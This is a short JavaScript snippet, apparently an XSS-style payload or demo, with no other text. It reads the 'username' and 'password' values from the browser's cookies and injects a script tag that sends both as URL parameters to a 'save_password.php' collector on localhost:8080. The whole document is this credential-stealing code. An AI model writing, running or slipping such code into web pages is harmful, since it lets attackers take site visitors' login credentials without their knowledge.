let username = getCookie("username");
let password = getCookie("password");
var script = document.createElement("script");
script.src = `http://localhost:8080/save_password.php?username=${username}&password=${password}`;
document.body.appendChild(script);

function getCookie(name) {
  let reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
  if ((arr = document.cookie.match(reg))) {
    return decodeURI(arr[2]);
  }
}
